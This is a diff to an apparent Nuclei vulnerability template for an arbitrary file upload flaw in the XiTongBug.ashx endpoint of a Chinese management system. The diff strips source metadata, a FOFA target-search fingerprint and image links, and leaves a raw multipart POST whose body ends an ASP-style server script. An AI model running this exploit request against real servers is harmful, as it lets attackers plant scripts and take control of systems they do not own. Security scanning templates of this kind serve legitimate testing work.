@@ -3,12 +3,8 @@ info:
   name: 九佳易管理系统 XiTongBug.ashx 存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fbl1qqdgktk1onn4'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fbl1qqdgktk1onn4
-    fofa: body="4008-820-967"
 http:
 - raw:
   - 'POST /XiTongBug.ashx HTTP/1.1
@@ -67,11 +63,9 @@ http:
 
     Response.End();%>
 
-    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1763892401402-34e14f44-20e8-4ebd-825c-ee085323fd50.png)
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 
-    回显了绝对路径，进行验证
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1763892401774-f1f8dbe2-90a8-4f5b-a25c-b7e8a87a4156.png)'
+    回显了绝对路径，进行验证'
   redirects: false
   matchers:
   - status:
